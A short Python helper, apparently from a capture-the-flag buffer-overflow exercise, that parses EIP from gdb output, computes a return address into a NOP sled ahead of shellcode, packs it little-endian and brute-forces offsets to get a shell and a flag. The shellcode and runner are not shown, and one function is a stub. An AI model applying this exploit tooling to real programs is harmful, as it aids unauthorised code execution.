import config as conf
import toimport as ti
import re
import os

#accepts string in format "0xffffd5b0"
def formatHex(hexstring):
	hexstring = hexstring[2:]
	formatedStr = ""
	for x in range(len(hexstring)-2, -2, -2):
		formatedStr += (r'\x' + hexstring[x:x+2])
	return bytes(formatedStr, "utf-8").decode("unicode_escape")

#accepts eip in format "0xffffd5b0
#returns start of code execution (somewhere in beginning nop sled)
def getCodeExecutionStart(eip):
	return hex(int(eip, 16) - conf.buff_size - len(ti.vals.shellcode))

def parseEipFromGdb(string):
	matchObj = re.search(r'eip at (0x.{8})', string)
	match = ""
	if matchObj:
		match = matchObj.group(1)
	return match

def getEipFromFile(filename):
	file = open(filename, 'r')
	return file.read()

def runProgram():
	conf.calcArgs()
	#run program with args based on config file using noah's part
	#get output of program (seg fault, shell, etc) and if it's a shell, run code to retrieve flag
def runExploit():
	for o in range(0, 50):
		ti.vals.offset = o
		runProgram()
		#if we get a seg fault, continue trying different offsets


#tests
eiptext = getEipFromFile("output")
print(eiptext)
eip = parseEipFromGdb(eiptext)
print(eip)
execstart = getCodeExecutionStart(eip)
print(execstart)
formatedexecstart = formatHex(execstart)
print(formatedexecstart)
